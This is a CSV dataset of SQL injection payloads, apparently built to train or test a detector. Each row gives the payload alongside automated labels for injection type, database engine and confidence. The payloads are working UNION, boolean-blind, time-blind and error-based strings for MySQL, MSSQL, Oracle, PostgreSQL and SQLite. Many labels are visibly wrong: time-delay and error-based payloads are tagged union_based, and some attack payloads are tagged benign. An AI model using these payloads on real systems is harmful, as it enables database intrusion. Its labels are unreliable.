id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1724,1 ) where 6725 = 6725 and 1553 = 7419,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
1726,"-2246"" ) ) union all select 4613,4613,4613,4613,4613,4613#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
1731,"1"" ) as hblk where 7982 = 7982 and 9611 = 6142--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
1732,"-7845' union all select 9574,9574,9574,9574,9574,9574#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
1736,"-1597"" where 5933 = 5933 or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
1738,"-9860 ) where 8743 = 8743 union all select 8743,8743,8743,8743,8743,8743,8743--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
1741,-3861' ) as zmja where 4036 = 4036 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
1749,1 ) ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
1754,"-4166%"" ) union all select 5190--",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
1756,"1"" ) ) as hdyn where 6027 = 6027 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
1761,-7971' union all select 4273#,union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
1762,1' ) ) and 2401 = 4693 and ( ( 'ssrm' = 'ssrm,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
1764,-9657' ) as ziiq where 7725 = 7725 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
1766,"-2610%"" ) union all select 7779,7779,7779,7779,7779--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
1768,"1 ) where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
1771,"-7233"" ) where 7574 = 7574 or 5821 = 3288",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
1772,"-4927' ) ) union all select 1924,1924#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
1774,"1%"" ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
1777,"1' ) ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
1780,"-4964"" ) ) union all select 4750,4750,4750,4750,4750--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
1786,"1%"" ) ) ) and 3116 = 9088#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
1790,"1%' ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
1794,"-5124'+ ( select 'xpww' where 1752 = 1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",union_based,generic,0.7,UNION-based payload detected. Payload length: 110 chars.,2
1795,"1"" ) where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
1798,-7453' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
1603,"1' where 1917 = 1917 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1631,1' ) ) ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
1649,"1"" ) as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
1686,"1"" ) as klur where 7046 = 7046 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1696,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 130 chars.",1
1709,1%' rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
1770,"1%' ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1789,"1 ) as rtpl where 1262 = 1262 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
1600,"1"" ) and elt ( 4249 = 4249,7259 ) and ( ""upkx"" = ""upkx",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1636,"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1645,"1' in boolean mode ) and elt ( 4249 = 4249,7259 ) #",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1656,"1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1710,1%' or sleep ( 5 ) and '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1715,"-8640 ) or elt ( 7657 = 5020,5020 ) and ( 2346 = 2346",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1720,"1%' ) and elt ( 4670 = 9403,9403 ) and ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1727,"-2726"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""ococ"" = ""ococ",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1730,1%' ) ) ) and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
1744,"-1631%"" ) or elt ( 8285 = 1709,1709 ) and ( ""%"" = """,boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1776,"1"" ) and elt ( 1889 = 7397,7397 ) and ( ""kuau"" = ""kuau",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1781,"1%' and elt ( 4249 = 4249,7259 ) and '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
1602,"-9699"" ) ) or ( 8459 = 8459 ) *4906 and ( ( ""dufs"" = ""dufs",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
1614,"1"" and ( 3020 = 3020 ) *6703",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1
1651,"-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and ( ( ( '%' = '",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 64 chars.,1
1661,-9363%' or ( 8459 = 8459 ) *4906 and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,1
1664,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""czvm"" like ""czvm",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,1
1712,"1%' ) ) ) and make_set ( 1543 = 5817,5817 ) and ( ( ( '%' = '",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,1
1742,"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
1765,"-6599%"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,1
1610,1 ) where 2390 = 2390,benign,generic,0.5,. Payload length: 21 chars.,1
1613,1' ) where 5378 = 5378,benign,generic,0.5,. Payload length: 22 chars.,1
1620,1' where 9216 = 9216,benign,generic,0.5,. Payload length: 20 chars.,1
1622,"1"" ) as giqb where 4664 = 4664",benign,generic,0.5,. Payload length: 30 chars.,1
1654,"1"" ) ) as chal where 6661 = 6661",benign,generic,0.5,. Payload length: 32 chars.,1
1655,1' ) ) as iipj where 6560 = 6560,benign,generic,0.5,. Payload length: 32 chars.,1
1668,"1"" ) as esks where 1138 = 1138",benign,generic,0.5,. Payload length: 30 chars.,1
1671,"1"" ) as mibc where 3113 = 3113",benign,generic,0.5,. Payload length: 30 chars.,1
1679,1 ) where 7159 = 7159,benign,generic,0.5,. Payload length: 21 chars.,1
1688,1' ) where 5145 = 5145,benign,generic,0.5,. Payload length: 22 chars.,1
1704,1' ) ) as pqbq where 1865 = 1865,benign,generic,0.5,. Payload length: 32 chars.,1
1719,"1"" where 1234 = 1234",benign,generic,0.5,. Payload length: 20 chars.,1
1725,1' where 1557 = 1557,benign,generic,0.5,. Payload length: 20 chars.,1
1734,"1"" where 8734 = 8734",benign,generic,0.5,. Payload length: 20 chars.,1
1737,"1"" ) as tuem where 1328 = 1328",benign,generic,0.5,. Payload length: 30 chars.,1
1740,"1"" ) ) as nwnp where 6140 = 6140",benign,generic,0.5,. Payload length: 32 chars.,1
1751,"1"" where 9889 = 9889",benign,generic,0.5,. Payload length: 20 chars.,1
1759,1 where 8393 = 8393,benign,generic,0.5,. Payload length: 19 chars.,1
1782,1 ) ) as ehlg where 6340 = 6340,benign,generic,0.5,. Payload length: 31 chars.,1
1792,"1"" ) ) as itxo where 7916 = 7916",benign,generic,0.5,. Payload length: 32 chars.,1
1796,1 ) as hvsk where 7902 = 7902,benign,generic,0.5,. Payload length: 29 chars.,1
1797,1' ) as bscn where 6907 = 6907,benign,generic,0.5,. Payload length: 30 chars.,1
1601,-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
1605,1 rlike ( select ( case when ( 6795 = 5898 ) then 1 else 0x28 end ) ) -- xdkx,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
1606,"1%"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""%"" = """,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
1607,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'rspz' = 'rspz",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
1609,"1'|| ( select 'lije' from dual where 5309 = 5309 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex', 'dual'; UNION-based payload detected; DB: sqlite",0
1617,"1%"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """,union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
1618,"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 2868 = 2868",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
1624,"1%"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""%"" = """,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1626,"-3362' where 6567 = 6567 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
1632,1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
1644,1' ) where 6305 = 6305 rlike ( select ( case when ( 8326 = 9749 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
1646,"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) -- dtha",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
1647,1%' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = ',union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
1648,"-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
1650,"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""eoab"" like ""eoab",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
1659,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
1667,select pg_sleep ( 5 ) and 'rpka' = 'rpka,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1670,1' in boolean mode ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1678,1%' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1682,"1' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
1683,"select pg_sleep ( 5 ) and ( ( ( ""nvuv"" like ""nvuv",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1695,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'hcpo' like 'hcpo,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
1697,select ( case when ( 5198 = 2518 ) then 5198 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
1702,1%' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = ',union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
